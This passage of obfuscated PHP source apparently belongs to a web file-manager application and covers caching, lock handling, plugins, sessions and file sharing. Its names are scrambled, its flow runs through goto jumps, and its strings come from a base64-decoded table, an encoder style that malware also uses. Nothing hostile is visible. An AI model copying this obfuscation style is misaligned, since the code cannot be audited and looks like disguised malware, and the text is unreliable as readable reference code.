parent::writeLog(trim($û­Õü¡Î), $ñ–ı®¼È); } } goto FµéèñªªŠ; e®¶ÇŸ÷Œˆ: $fileSize = strrev(base64_decode($_SERVER[ó÷»×][0])); function binCheckNeq($ÓŠôëÄ÷, $Ÿ…ÉØÂğ) { return $ÓŠôëÄ÷ != $Ÿ…ÉØÂğ; } $_SERVER[$_SERVER[ó÷»×][1]] = $fileSize($_SERVER[$_SERVER[ó÷»×][2]]); goto aöÖÙ²‡·…; aàŞÂØŒ‘¥: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($•şˆ¤€Ë, $”¿ŠœÉ) { $å˜ÉÇå =& $_SERVER[«òÑğ]; $this->cachePath = $•şˆ¤€Ë[$å˜ÉÇå[87]]; $this->prefix = $å˜ÉÇå[924]; $this->cacheTime = $”¿ŠœÉ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($äÉš±ğ¥) { $¹¥Ğ›ò¹ =& $_SERVER[«òÑğ]; $äÉš±ğ¥ = str_replace(array($¹¥Ğ›ò¹[925], $¹¥Ğ›ò¹[100], $¹¥Ğ›ò¹[76]), $¹¥Ğ›ò¹[926], $äÉš±ğ¥); return $this->cachePath . $¹¥Ğ›ò¹[927] . $äÉš±ğ¥ . $¹¥Ğ›ò¹[928]; } public function set($ÌÛ»—•, $ÔÉˆ¤º, $¢ÂÚ¥Õ = false) { $¢ÂÚ¥Õ = $¢ÂÚ¥Õ ? $¢ÂÚ¥Õ : $this->cacheTime; $ñ¢æ½û… = $this->getFile($ÌÛ»—•); if (file_put_contents($ñ¢æ½û…, $this->prefix . $ÔÉˆ¤º, LOCK_EX)) { @touch($ñ¢æ½û…, intval(time() + $¢ÂÚ¥Õ)); clearstatcache(); return !0; } @unlink($ñ¢æ½û…); return !1; } public function get($»Öº°ù˜) { $±„Ë•‚° = $this->getFile($»Öº°ù˜); if (file_exists($±„Ë•‚°) && filemtime($±„Ë•‚°) < time()) { @unlink($±„Ë•‚°); return !1; } $ğû—ËÕ = @file_get_contents($±„Ë•‚°); return substr($ğû—ËÕ, strlen($this->prefix)); } public function remove($‰÷É¥ÆÓ) { $ó¾®‹‰É = $this->getFile($‰÷É¥ÆÓ); return @unlink($ó¾®‹‰É); } public function deleteAll() { $††¶äÉ¦ =& $_SERVER[«òÑğ]; $È‚»ÁÆ¥ = scandir($this->cachePath); foreach ($È‚»ÁÆ¥ as $Œıº¹¡µ) { $…€¦ÛœÏ = $this->cachePath . $Œıº¹¡µ; if (strpos($…€¦ÛœÏ, $††¶äÉ¦[928]) && strpos($…€¦ÛœÏ, $††¶äÉ¦[929])) { @unlink($…€¦ÛœÏ); } } } public function clearTimeout() { $Æ´è‘™ß =& $_SERVER[«òÑğ]; $˜Øğ•éà = scandir($this->cachePath); foreach ($˜Øğ•éà as $Õæµæ½Ÿ) { $ÏáÔ‰Óâ = $this->cachePath . $Õæµæ½Ÿ; if (strpos($ÏáÔ‰Óâ, $Æ´è‘™ß[928]) && strpos($ÏáÔ‰Óâ, $Æ´è‘™ß[929]) && filemtime($ÏáÔ‰Óâ) < time()) { @unlink($ÏáÔ‰Óâ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $˜¹©ŞèÁ =& $_SERVER[«òÑğ]; if (self::$handle) { return self::$handle; } $¶±úãÍ = $GLOBALS[$˜¹©ŞèÁ[6]][$˜¹©ŞèÁ[427]]; self::$timeout = $¶±úãÍ[$˜¹©ŞèÁ[930]] ? $¶±úãÍ[$˜¹©ŞèÁ[930]] : 10; $——ÅÈöİ = _get($GLOBALS[$˜¹©ŞèÁ[6]], $˜¹©ŞèÁ[931]); $è§­…… = $¶±úãÍ[$˜¹©ŞèÁ[916]] ? $¶±úãÍ[$˜¹©ŞèÁ[916]] : $˜¹©ŞèÁ[233]; if ($è§­…… == $˜¹©ŞèÁ[21] && $——ÅÈöİ == $˜¹©ŞèÁ[13]) { $è§­…… = $˜¹©ŞèÁ[233]; } switch ($è§­……) { case $˜¹©ŞèÁ[919]: self::$handle = new CacheLockRedis(); break; case $˜¹©ŞèÁ[920]: self::$handle = new CacheLockMemcached(); break; case $˜¹©ŞèÁ[21]: self::$handle = new CacheLockDatabase(); break; case $˜¹©ŞèÁ[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($˜¹©ŞèÁ[932], $˜¹©ŞèÁ[933]); } return self::$handle; } private static function key($ìøè»²) { return $_SERVER[«òÑğ][934] . Cache::key($ìøè»²); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($äû³ç¶„ = '') { self::$errorMsg = $äû³ç¶„; } public static function lockGlobal($†‚ƒ‡¢Å, $»ĞÇÕô) { return self::lock($†‚ƒ‡¢Å, $»ĞÇÕô, !0); } public static function lock($›àæ‰ÚŞ, $çĞğê = false, $¡æÂíÅ = false) { $¿¢Ï¢¨È =& $_SERVER[«òÑğ]; $İŠÜä°ó = self::init(); $˜Ì˜Î«Ü = self::key($›àæ‰ÚŞ); $çĞğê = $çĞğê ? $çĞğê : self::$timeout; $ù£Ë™Ä = timeFloat(); if ($GLOBALS[$¿¢Ï¢¨È[935]]) { if (!$İŠÜä°ó->lock($˜Ì˜Î«Ü, 0.2)) { die; } return !0; } $§ª‘Ö½¿ = $İŠÜä°ó->lock($˜Ì˜Î«Ü, $çĞğê); $Ô¬ó•ñø = timeFloat(); if (!$§ª‘Ö½¿) { $Ò¶©›¬¯ = "\x6c\x6f\x63\x6b\x20\145\162\162\x6f\x72\x3b\x6b\145\x79\75{$›àæ‰ÚŞ}\73\164\x69\155\145\75{$çĞğê}\x3b" . self::$errorMsg . $¿¢Ï¢¨È[74] . get_caller_msg(); $µÚ¢›Ü´ = LNG($¿¢Ï¢¨È[936]) . "\x28{$çĞğê}\x73\51\x2e" . LNG($¿¢Ï¢¨È[937]); $µÚ¢›Ü´ .= $¿¢Ï¢¨È[938]; if (is_string(self::$errorMsg) && self::$errorMsg) { $µÚ¢›Ü´ = $µÚ¢›Ü´ . $¿¢Ï¢¨È[939] . self::$errorMsg; } write_log($¿¢Ï¢¨È[940] . sprintf($¿¢Ï¢¨È[941], timeFloat() - $ù£Ë™Ä) . $¿¢Ï¢¨È[942] . $Ò¶©›¬¯ . $¿¢Ï¢¨È[943] . json_encode(error_get_last()), $¿¢Ï¢¨È[933]); show_json($µÚ¢›Ü´, !1); } if (!$¡æÂíÅ) { self::$lockItem[$˜Ì˜Î«Ü] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¯·ÄÖıƒ = number_format(timeFloat() - $Ô¬ó•ñø, 3); write_log($¿¢Ï¢¨È[944] . $›àæ‰ÚŞ . $¿¢Ï¢¨È[945] . $¯·ÄÖıƒ, $¿¢Ï¢¨È[933]); } return $§ª‘Ö½¿; } public static function lockGet($ù‚ĞÚÆæ) { $ÎÀ£îç¬ = self::key($ù‚ĞÚÆæ); if (self::$lockItem[$ÎÀ£îç¬]) { return self::$lockItem[$ÎÀ£îç¬]; } return self::init()->lockGet($ÎÀ£îç¬); } public static function unlock($Ï¿‘£¾Ä) { $›öä·ıÒ =& $_SERVER[«òÑğ]; $¤ÇœÕ­ = self::key($Ï¿‘£¾Ä); self::$lockItem[$¤ÇœÕ­] = null; self::init()->unlock($¤ÇœÕ­); if (GLOBAL_DEBUG_LOG_ALL) { write_log($›öä·ıÒ[946] . $Ï¿‘£¾Ä, $›öä·ıÒ[933]); } return; } public static function unlockRuntime() { $Ë£’—± =& $_SERVER[«òÑğ]; $™–îêÚË = self::init(); $ÉÎÈñ÷ = !1; foreach (self::$lockItem as $ı‡íÔñ => $¶‘ƒ™…š) { if (!$¶‘ƒ™…š) { continue; } $™–îêÚË->unlock($ı‡íÔñ); if (!$ÉÎÈñ÷) { $ÉÎÈñ÷ = !0; write_log($Ë£’—±[947] . $ı‡íÔñ . $Ë£’—±[74] . get_caller_msg(), $Ë£’—±[933]); continue; } write_log($Ë£’—±[947] . $ı‡íÔñ, $Ë£’—±[933]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $æµÄ´Äã = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Ë£’—±[948] . $æµÄ´Äã . $Ë£’—±[949] . ACTION, $Ë£’—±[933]); } } public static function fileLock($¿šïïû) { $µ´—Ğ¸ò =& $_SERVER[«òÑğ]; if (!$GLOBALS[$µ´—Ğ¸ò[950]]) { $GLOBALS[$µ´—Ğ¸ò[950]] = array(); } $GLOBALS[$µ´—Ğ¸ò[950]][$¿šïïû] = !1; $ø‹ï‰Ëó = fopen(DATA_PATH . $¿šïïû . $µ´—Ğ¸ò[951], $µ´—Ğ¸ò[952]); if (!$ø‹ï‰Ëó) { return !1; } $GLOBALS[$µ´—Ğ¸ò[950]][$¿šïïû] = $ø‹ï‰Ëó; if (flock($ø‹ï‰Ëó, LOCK_EX)) { return !0; } self::unlock($¿šïïû); show_json($µ´—Ğ¸ò[953], !1); return !1; } public static function fileUnlock($Ÿ¾êÍœ†) { $÷ŒÍİı =& $_SERVER[«òÑğ]; $…œçßË¿ = $GLOBALS[$÷ŒÍİı[950]][$Ÿ¾êÍœ†]; if (!$…œçßË¿) { return; } $GLOBALS[$÷ŒÍİı[950]][$Ÿ¾êÍœ†] = !1; flock($…œçßË¿, LOCK_UN); fclose($…œçßË¿); } public static function fileUnlockAll() { $áê±‘ˆ¡ =& $_SERVER[«òÑğ]; if (!isset($GLOBALS[$áê±‘ˆ¡[950]]) || !$GLOBALS[$áê±‘ˆ¡[950]]) { return; } foreach ($GLOBALS[$áê±‘ˆ¡[950]] as $²¡Œ“©Ä => $á£¬ ›º) { if (!$á£¬ ›º) { continue; } $GLOBALS[$áê±‘ˆ¡[950]][$²¡Œ“©Ä] = !1; flock($á£¬ ›º, LOCK_UN); fclose($á£¬ ›º); } $GLOBALS[$áê±‘ˆ¡[950]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto DÕ„‰‡ËÀÜ; c”•†Œ´Ò: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\160\154\x75\147\x69\x6e\114\x69\163\x74"; public $field = array("\156\141\155\x65", "\x73\164\x61\164\x75\163", "\x72\x65\147\151\x65\163\x74", "\143\x6f\x6e\146\x69\x67"); public function loadList($Ç²œß÷ = false) { $åú¼Ò‡Ì = array_to_keyvalue($this->listData(), $_SERVER[«òÑğ][32]); if ($Ç²œß÷) { return $åú¼Ò‡Ì[$Ç²œß÷]; } return $åú¼Ò‡Ì; } public function init() { $«Ü³Ğâù =& $_SERVER[«òÑğ]; Hook::trigger($«Ü³Ğâù[2109]); $³Ğù©§Í = $this->loadPluginList(); foreach ($³Ğù©§Í as $±µÍ›Î¶ => $´·ùÑØË) { $óõ§§ÜÃ = $this->appAllow($±µÍ›Î¶, $´·ùÑØË); if (!$óõ§§ÜÃ) { continue; } foreach ($´·ùÑØË[$«Ü³Ğâù[2110]] as $Æ˜ÓÁ => $Û´Ë©Ì¥) { Hook::bind($Æ˜ÓÁ, $Û´Ë©Ì¥); } } Hook::trigger($«Ü³Ğâù[2111]); Hook::trigger(ACTION); } public function appAllow($şÏ±èÀó, $ÏËüÍ–¬, $ ©ïÒ = true) { $Å’ïô…Š =& $_SERVER[«òÑğ]; $ëé¤®ûç = PLUGIN_DIR . $şÏ±èÀó . $Å’ïô…Š[2112]; if (!is_array($ÏËüÍ–¬) || !is_array($ÏËüÍ–¬[$Å’ïô…Š[2110]]) || $ÏËüÍ–¬[$Å’ïô…Š[834]] != 1 || !is_file($ëé¤®ûç)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Å’ïô…Š[6]][$Å’ïô…Š[2113]] || !$GLOBALS[$Å’ïô…Š[6]][$Å’ïô…Š[2114]]) { return !0; } $ò¾½¼•· = explode($Å’ïô…Š[50], strtolower($GLOBALS[$Å’ïô…Š[6]][$Å’ïô…Š[2114]])); return in_array(strtolower($şÏ±èÀó), $ò¾½¼•·) ? !1 : !0; } if ($ ©ïÒ && !Action($Å’ïô…Š[2115])->checkAuth($şÏ±èÀó)) { return !1; } return !0; } public function unInstall($÷ÁÇıÒ) { $äœĞÖçü =& $_SERVER[«òÑğ]; $íÏ–àîÌ = $this->loadList($÷ÁÇıÒ); if (file_exists(PLUGIN_DIR . $÷ÁÇıÒ)) { Hook::apply($÷ÁÇıÒ . $äœĞÖçü[2116]); } $this->remove($íÏ–àîÌ[$äœĞÖçü[478]]); } public function changeStatus($Øæ¯ıÑ, $‹Èšê) { $ÄùÏ­Ã™ =& $_SERVER[«òÑğ]; $£¬™œØ¹ = $this->loadList($Øæ¯ıÑ); if ($‹Èšê) { Hook::apply($Øæ¯ıÑ . $ÄùÏ­Ã™[2117]); } $this->update($£¬™œØ¹[$ÄùÏ­Ã™[478]], array($ÄùÏ­Ã™[2118] => $‹Èšê)); } public function appRegist($ù·Ù·‡, $ÊÜÚßƒ‡) { $¯´Ôê¾ =& $_SERVER[«òÑğ]; $êÍí À† = $this->loadList($ù·Ù·‡); if ($êÍí À†) { $this->update($êÍí À†[$¯´Ôê¾[478]], array($¯´Ôê¾[2110] => $ÊÜÚßƒ‡)); } else { $§€Å´„Å = array($¯´Ôê¾[32] => $ù·Ù·‡, $¯´Ôê¾[2110] => $ÊÜÚßƒ‡, $¯´Ôê¾[834] => 0, $¯´Ôê¾[6] => $this->getConfigDefault($ù·Ù·‡)); $this->insert($§€Å´„Å); } } public function getConfigDefault($ªçÜŞÅå) { $œ’Ì¥É =& $_SERVER[«òÑğ]; $ÏÕ²µå˜ = array(); $ìñƒ½ş = $this->getPackageJson($ªçÜŞÅå); if (!$ìñƒ½ş && is_array($ìñƒ½ş[$œ’Ì¥É[2119]])) { return $ÏÕ²µå˜; } foreach ($ìñƒ½ş[$œ’Ì¥É[2119]] as $†ƒ›‘­ => $îóÏ¼¿ı) { if (!isset($îóÏ¼¿ı[$œ’Ì¥É[453]]) || isset($ÏÕ²µå˜[$†ƒ›‘­])) { continue; } $ÏÕ²µå˜[$†ƒ›‘­] = $îóÏ¼¿ı[$œ’Ì¥É[453]]; } return $ÏÕ²µå˜; } public function getPackageJson($Š³ğæÌ¿) { return Hook::apply($Š³ğæÌ¿ . $_SERVER[«òÑğ][2120]); } public function getConfig($ˆöıŸ¿š, $¼ƒäŒŸï = false) { $¤”…°Íƒ =& $_SERVER[«òÑğ]; $óÙŠå÷ª = array(); $ú¯®ü®ö = $this->loadList($ˆöıŸ¿š); if ($ú¯®ü®ö && is_array($ú¯®ü®ö[$¤”…°Íƒ[6]])) { $óÙŠå÷ª = $ú¯®ü®ö[$¤”…°Íƒ[6]]; } if (!$óÙŠå÷ª || $¼ƒäŒŸï) { $óÙŠå÷ª = $this->getConfigDefault($ˆöıŸ¿š); } return $óÙŠå÷ª; } public function setConfig($èÓÑè†÷, $ñíÌääÔ = false) { $èµÓñŠı =& $_SERVER[«òÑğ]; $¯®Ò¤‰Ú = $this->loadList($èÓÑè†÷); if (!$¯®Ò¤‰Ú) { return !1; } $«Ç¦Æ×£ = $¯®Ò¤‰Ú[$èµÓñŠı[6]]; if ($ñíÌääÔ == !1) { $«Ç¦Æ×£ = array(); $ñíÌääÔ = $this->getConfigDefault($èÓÑè†÷); } foreach ($ñíÌääÔ as $Ğ¤ˆæ€Ö => $ôêõ‘ì­) { $«Ç¦Æ×£[$Ğ¤ˆæ€Ö] = is_string($ôêõ‘ì­) ? trim($ôêõ‘ì­) : $ôêõ‘ì­; } $this->update($¯®Ò¤‰Ú[$èµÓñŠı[478]], array($èµÓñŠı[6] => $«Ç¦Æ×£)); } public function viewList() { $éŞú¡ÓŞ =& $_SERVER[«òÑğ]; $àÍ§´·ˆ = $this->loadList(); $this->pluginScan($àÍ§´·ˆ); $àÍ§´·ˆ = $this->loadPluginList(); $Ö²ÔÄô€ = array(); foreach ($àÍ§´·ˆ as $¢ğ“§á¨ => $Ô»«ßµÄ) { $•äÛÄ±Ñ = $Ô»«ßµÄ; unset($Ô»«ßµÄ[$éŞú¡ÓŞ[2110]], $Ô»«ßµÄ[$éŞú¡ÓŞ[6]]); $†»½½õ = PLUGIN_DIR . $Ô»«ßµÄ[$éŞú¡ÓŞ[32]] . $éŞú¡ÓŞ[2112]; if (!is_file($†»½½õ)) { continue; } $ÚÌü”ÓÙ = Hook::apply($Ô»«ßµÄ[$éŞú¡ÓŞ[32]] . $éŞú¡ÓŞ[2120]); if (!is_array($ÚÌü”ÓÙ)) { continue; } $Ö²ÔÄô€[$¢ğ“§á¨] = array_merge($Ô»«ßµÄ, $ÚÌü”ÓÙ); if ($•äÛÄ±Ñ[$éŞú¡ÓŞ[6]][$éŞú¡ÓŞ[1696]] != $ÚÌü”ÓÙ[$éŞú¡ÓŞ[1670]]) { Hook::apply($Ô»«ßµÄ[$éŞú¡ÓŞ[32]] . $éŞú¡ÓŞ[2117]); $•äÛÄ±Ñ[$éŞú¡ÓŞ[6]][$éŞú¡ÓŞ[1696]] = $ÚÌü”ÓÙ[$éŞú¡ÓŞ[1670]]; $this->update($Ô»«ßµÄ[$éŞú¡ÓŞ[478]], array($éŞú¡ÓŞ[6] => $•äÛÄ±Ñ[$éŞú¡ÓŞ[6]])); } } return $Ö²ÔÄô€; } private function loadPluginList() { $Ç“ú®à§ =& $_SERVER[«òÑğ]; $ÆŠ—ÌÕô = $this->loadList(); if (strtolower(MOD) == $Ç“ú®à§[2121]) { return $ÆŠ—ÌÕô; } $ğå—‘ÒÑ = Hook::trigger($Ç“ú®à§[2122], $ÆŠ—ÌÕô); if ($ÆŠ—ÌÕô && !$ğå—‘ÒÑ) { die; } return $ğå—‘ÒÑ ? $ğå—‘ÒÑ : $ÆŠ—ÌÕô; } private function pluginScan($ò†œ²…ƒ) { $“ŞÕé  =& $_SERVER[«òÑğ]; recursion_dir(PLUGIN_DIR, $•«ş¥óô, $ãõ‹ßá, 0); foreach ($•«ş¥óô as $­•Ôã) { $ÄŸõ•şÂ = get_path_this($­•Ôã); if (isset($ò†œ²…ƒ[$ÄŸõ•şÂ]) || !file_exists($­•Ôã . $“ŞÕé [2123]) || !file_exists($­•Ôã . $“ŞÕé [2112])) { continue; } Hook::apply($ÄŸõ•şÂ . $“ŞÕé [2117]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\x6d\137\x73\145\x73\163\151\157\156"; public function get($§ò¶”·à) { $éĞÕ¸×ì =& $_SERVER[«òÑğ]; $šíÕöªå = $this->where(array($éĞÕ¸×ì[2124] => $§ò¶”·à))->find(); if (!is_array($šíÕöªå)) { return !1; } return $šíÕöªå[$éĞÕ¸×ì[171]]; } public function set($ÉÜˆË™å, $ÂêìÏÛñ, $âã¾åç¯ = 3600) { $×êòÍ =& $_SERVER[«òÑğ]; $¼´ÉİÉ = array($×êòÍ[2124] => $ÉÜˆË™å, $×êòÍ[2024] => $ÂêìÏÛñ, $×êòÍ[2125] => $âã¾åç¯ + time()); if (Session::get($×êòÍ[2126])) { $¼´ÉİÉ[$×êòÍ[1784]] = Session::get($×êòÍ[2126]); } else { $¼´ÉİÉ[$×êòÍ[1784]] = 0; } if ($this->get($ÉÜˆË™å)) { return $this->where(array($×êòÍ[2124] => $ÉÜˆË™å))->save($¼´ÉİÉ); } else { return $this->add($¼´ÉİÉ, array(), !0); } } public function remove($úıúÇÏ) { return $this->where(array($_SERVER[«òÑğ][2124] => $úıúÇÏ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[«òÑğ][2127] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\x54\x69\x6d\145", "\x74\x69\155\x65", "\151\x6e\163\145\x72\x74\54\165\x70\144\x61\164\x65", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\143\162\x65\141\164\145\x54\151\155\145", "\164\x69\155\145", "\151\x6e\x73\145\x72\x74", "\146\165\156\143\x74\x69\157\x6e"), array("\x6f\160\x74\151\x6f\156\163", '', "\151\156\163\145\x72\x74\x2c\165\160\x64\141\x74\145\54\163\x65\x6c\x65\143\x74", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($§šÜ‚ä€) { $öÓŞÖ¬ =& $_SERVER[«òÑğ]; $˜¾ªëÂĞ = isset($§šÜ‚ä€[0]) ? $§šÜ‚ä€[0] : !1; $…”´ î = $öÓŞÖ¬[2128] . USER_ID; return array($öÓŞÖ¬[2129] => array(USER_ID, $öÓŞÖ¬[2130]), $öÓŞÖ¬[2069] => array($˜¾ªëÂĞ, $öÓŞÖ¬[2131], $…”´ î)); } protected function listSimple() { $±•˜¢ò¸ = array($_SERVER[«òÑğ][1784] => USER_ID); $³Í¤Øó÷ = $this->field($this->fieldList)->where($±•˜¢ò¸)->select(); return $³Í¤Øó÷ ? $³Í¤Øó÷ : array(); } protected function getInfo($õ×š˜åé, $ÉùÜúÆ¥ = false, $³™÷Ô¥ = '') { $½è³ßå’ =& $_SERVER[«òÑğ]; if (!$³™÷Ô¥) { $³™÷Ô¥ = $½è³ßå’[2128] . USER_ID; } if ($ÉùÜúÆ¥) { return $this->_getShareInfo(array($½è³ßå’[673] => $õ×š˜åé)); } $˜“º—ıÈ = $this->cacheFunctionGet($½è³ßå’[2071], $õ×š˜åé, $³™÷Ô¥); $Ò´«ğºÇ = $this->shareInfoMofify($˜“º—ıÈ, $½è³ßå’[226]); if (isset($˜“º—ıÈ[$½è³ßå’[88]]) && $Ò´«ğºÇ != $˜“º—ıÈ[$½è³ßå’[88]]) { $»İêÉ´ù = $this->cacheKeyMake($½è³ßå’[2071], $õ×š˜åé, $³™÷Ô¥); $˜“º—ıÈ = $this->_getShareInfo(array($½è³ßå’[673] => $õ×š˜åé)); Cache::set($»İêÉ´ù, $˜“º—ıÈ); } return $˜“º—ıÈ; } private function shareInfoMofify(&$¿œÂÒ’, $ôå²ğıŠ = "\147\x65\x74") { $©á˜§• =& $_SERVER[«òÑğ]; if (!$¿œÂÒ’ || !isset($¿œÂÒ’[$©á˜§•[673]])) { return; } $¿°ìÕçñ = $©á˜§•[2132] . $¿œÂÒ’[$©á˜§•[673]]; if ($ôå²ğıŠ == $©á˜§•[226]) { return Cache::get($¿°ìÕçñ); } else { if ($ôå²ğıŠ == $©á˜§•[2099]) { $˜·æÑ¯Š = Cache::get($¿°ìÕçñ); if ($˜·æÑ¯Š === $¿œÂÒ’[$©á˜§•[88]]) { return; } $¿œÂÒ’[$©á˜§•[2133]] = USER_ID . $©á˜§•[465] . $¿œÂÒ’[$©á˜§•[88]]; Cache::set($¿°ìÕçñ, $¿œÂÒ’[$©á˜§•[88]]); } else { if ($ôå²ğıŠ == $©á˜§•[2134]) { Cache::remove($¿°ìÕçñ); } } } } public function getInfoByHash($úŠ¨³³ª) { return $this->_getShareInfo(array($_SERVER[«òÑğ][2135] => $úŠ¨³³ª)); } public function getInfoByPath($ñüšêÖ) { $ñ±”ÛÅ¿ =& $_SERVER[«òÑğ]; $²âÛ÷ï¿ = array($ñ±”ÛÅ¿[1784] => USER_ID, $ñ±”ÛÅ¿[194] => $ñüšêÖ); return $this->_getShareInfo($²âÛ÷ï¿); } public function getInfoBySourcePath($šçå«¯“) { $‚áª¤ùÜ =& $_SERVER[«òÑğ]; $ïŞ‘¼Ìü = array($‚áª¤ùÜ[1784] => USER_ID, $‚áª¤ùÜ[1267] => $šçå«¯“); return $this->_getShareInfo($ïŞ‘¼Ìü); } private function _getShareInfo($ •£ªáæ) { $ŠÌåÁ„Õ =& $_SERVER[«òÑğ]; $’æ„»á² = $this->where($ •£ªáæ)->find(); if (!$’æ„»á²) { return !1; } $ •£ªáæ = array($ŠÌåÁ„Õ[673] => $’æ„»á²[$ŠÌåÁ„Õ[673]]); $†Á¹¨€ = $ŠÌåÁ„Õ[2136]; $Á˜›ŒŒÌ = Model($ŠÌåÁ„Õ[674])->order($ŠÌåÁ„Õ[478])->field($†Á¹¨€)->where($ •£ªáæ)->select(); if ($’æ„»á²[$ŠÌåÁ„Õ[194]] == $ŠÌåÁ„Õ[231]) { $’æ„»á²[$ŠÌåÁ„Õ[90]] = IO::info($’æ„»á²[$ŠÌåÁ„Õ[1267]]); } else { $’æ„»á²[$ŠÌåÁ„Õ[90]] = Model($ŠÌåÁ„Õ[1431])->pathInfo($’æ„»á²[$ŠÌåÁ„Õ[194]]); } $’æ„»á²[$ŠÌåÁ„Õ[2137]] = $Á˜›ŒŒÌ; $this->shareInfoMofify($’æ„»á², $ŠÌåÁ„Õ[2099]); return $’æ„»á²; } protected function getInfoAuth($Ğ’É×”) { $Ç”ù¦ñ¯ =& $_SERVER[«òÑğ]; $Ä§²ƒŒ“ = $this->getInfo($Ğ’É×”); if ($Ä§²ƒŒ“[$Ç”ù¦ñ¯[1784]] == USER_ID) { $Ä§²ƒŒ“[$Ç”ù¦ñ¯[490]] = $Ä§²ƒŒ“[$Ç”ù¦ñ¯[90]][$Ç”ù¦ñ¯[490]]; } else { $Ä§²ƒŒ“[$Ç”ù¦ñ¯[490]] = Model($Ç”ù¦ñ¯[572])->authMake($Ä§²ƒŒ“[$Ç”ù¦ñ¯[2137]]); } return $Ä§²ƒŒ“; } protected function listData($¾‚‚¥Âû = null, $ÛÉüåÏ = 300) { $€†Ä…²Ö =& $_SERVER[«òÑğ]; $ÇÄ ´º = array(array($€†Ä…²Ö[567] => array($€†Ä…²Ö[1099], 0), $€†Ä…²Ö[671] => array($€†Ä…²Ö[1099], 0), $€†Ä…²Ö[2138] => $€†Ä…²Ö[2087])); if ($¾‚‚¥Âû == $€†Ä…²Ö[2139]) { $ÇÄ ´º = array($€†Ä…²Ö[567] => 1); } else { if ($¾‚‚¥Âû == $€†Ä…²Ö[1252]) { $ÇÄ ´º = array($€†Ä…²Ö[671] => 1); } } $ÇÄ ´º[$€†Ä…²Ö[1784]] = USER_ID; $¯À±òŸ… = $this->where($ÇÄ ´º)->selectPage($ÛÉüåÏ); return $¯À±òŸ…; } protected function listToMe($©·î™ÚÃ = 300) { $– Ç©Ï¸ =& $_SERVER[«òÑğ]; $ßíĞÆ€£ = Model($– Ç©Ï¸[2140])->userGroupParents(USER_ID); $ıÚµ¾¬“ = array($– Ç©Ï¸[656] => SourceModel::TYPE_USER, $– Ç©Ï¸[574] => USER_ID); if ($ßíĞÆ€£) { $ıÚµ¾¬“ = array(array($– Ç©Ï¸[656] => SourceModel::TYPE_USER, $– Ç©Ï¸[574] => USER_ID), array($– Ç©Ï¸[656] => SourceModel::TYPE_GROUP, $– Ç©Ï¸[574] => array($– Ç©Ï¸[7], $ßíĞÆ€£)), $– Ç©Ï¸[2138] => $– Ç©Ï¸[2087]); } $‚¾¹ù¡“ = Model($– Ç©Ï¸[674])->where($ıÚµ¾¬“)->selectPage($©·î™ÚÃ); $“½†ÉØÁ = array_to_keyvalue_group($‚¾¹ù¡“[$– Ç©Ï¸[448]], $– Ç©Ï¸[673]); if (!$“½†ÉØÁ) { return $‚¾¹ù¡“; } $™Ü¬®Ÿ× = $– Ç©Ï¸[2141]; $ıÚµ¾¬“ = array($– Ç©Ï¸[673] => array($– Ç©Ï¸[495], array_keys($“½†ÉØÁ)), $– Ç©Ï¸[1784] => array($– Ç©Ï¸[1101], $– Ç©Ï¸[231])); $Òï‹ Î€ = $this->field($™Ü¬®Ÿ×)->where($ıÚµ¾¬“)->select(); foreach ($Òï‹ Î€ as $ÉôÇ–°ù => &$ì¡ñ®) { $ì¡ñ®[$– Ç©Ï¸[2137]] = $“½†ÉØÁ[$ì¡ñ®[$– Ç©Ï¸[673]]]; } unset($ì¡ñ®); $ë¿Ã¸ùË = array($– Ç©Ï¸[2142] => $Òï‹ Î€, $– Ç©Ï¸[2143] => $‚¾¹ù¡“[$– Ç©Ï¸[445]]); return $ë¿Ã¸ùË; } protected function shareAdd($‹­Ü½ë¶, $ğãƒ±Ùê) { $úÙÂ Ú =& $_SERVER[«òÑğ]; $±…çÒø« = $this->_addShareData($‹­Ü½ë¶, $ğãƒ±Ùê); if (!empty($ğãƒ±Ùê[$úÙÂ Ú[2144]])) { $this->_shareAuthSet($±…çÒø«, $ğãƒ±Ùê[$úÙÂ Ú[2144]]); } $this->shareEventAdd($‹­Ü½ë¶, $ğãƒ±Ùê, $úÙÂ Ú[2145]); return $±…çÒø«; } protected function shareAddSystem($¯‘‚†´Ç, $åÓñüÉ) { $„¤Šòß =& $_SERVER[«òÑğ]; $‚Ğˆ×– = $this->_addShareData($¯‘‚†´Ç, $åÓñüÉ, $„¤Šòß[192]); $this->_shareAuthSet($‚Ğˆ×–, $åÓñüÉ[$„¤Šòß[2144]]); return $‚Ğˆ×–; } private function shareEventAdd($¶ğ›ÀÔ, $°õà­àÇ, $Ïî‹°Ş = "\141\x64\144") { $¨ïğçï =& $_SERVER[«òÑğ]; if (!$¶ğ›ÀÔ || $¶ğ›ÀÔ == $¨ïğçï[231]) { return; } if ($Ïî‹°Ş == $¨ïğçï[2145]) { if ($°õà­àÇ[$¨ïğçï[567]] == $¨ïğçï[91]) { Model($¨ïğçï[641])->eventShare($¶ğ›ÀÔ, $¨ïğçï[2146]); } if ($°õà­àÇ[$¨ïğçï[671]] == $¨ïğçï[91]) { Model($¨ïğçï[641])->eventShare($¶ğ›ÀÔ, $¨ïğçï[2147]); } return; } $öìË¤Ã = $this->getInfoByPath($¶ğ›ÀÔ); $ñéÒˆ = $¨ïğçï[2148]; if ($öìË¤Ã[$¨ïğçï[567]] == $¨ïğçï[231] && $°õà­àÇ[$¨ïğçï[567]] == $¨ïğçï[91]) { $ñéÒˆ = $¨ïğçï[2146]; } if 